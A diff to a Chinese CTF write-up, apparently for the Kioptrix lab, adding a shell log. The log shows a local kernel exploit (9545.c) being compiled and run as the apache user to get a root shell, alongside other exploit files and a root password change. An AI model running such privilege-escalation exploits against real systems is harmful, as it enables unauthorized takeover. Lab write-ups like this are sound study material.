@@ -181,6 +181,29 @@ Retype new UNIX password: 123456
 Changing password for user root.
 passwd: all authentication tokens updated successfully.
 ~~~
+9545.c也能成功
+~~~bash
+bash-3.00$ gcc -Wall -o 9545 9545.c
+9545.c:376:28: warning: no newline at end of file
+bash-3.00$ ls -al
+total 532
+drwxr-xrwx   4 root   root     4096 May  4 23:57 .
+drwxr-xr-x  23 root   root     4096 May  4 22:33 ..
+-rwxr-xr-x   1 apache apache   6932 May  4 22:25 0x82-CVE-2009-2698
+-rwxrwxrwx   1 apache apache  17060 May  5  2022 1397.c
+-rw-r--r--   1 apache apache   2535 May  5  2022 9542.c
+-rwxr-xr-x   1 apache apache   6762 May  4 23:57 9545
+-rw-r--r--   1 apache apache   9408 May  5  2022 9545.c
+drwxrwxrwt   2 root   root     4096 May  4 21:11 .font-unix
+drwxrwxrwt   2 root   root     4096 May  4 21:11 .ICE-unix
+-rwxr-xr-x   1 apache apache 466816 May  4 22:13 k-rad3
+bash-3.00$ id
+uid=48(apache) gid=48(apache) groups=48(apache)
+bash-3.00$ ./9545
+sh: no job control in this shell
+sh-3.00# id
+uid=0(root) gid=0(root) groups=48(apache)
+~~~
 
 <img src="https://github.com/eagleatman/mywriteup/blob/main/kipptrix-11-23/images/6.png" width="56%" />
 
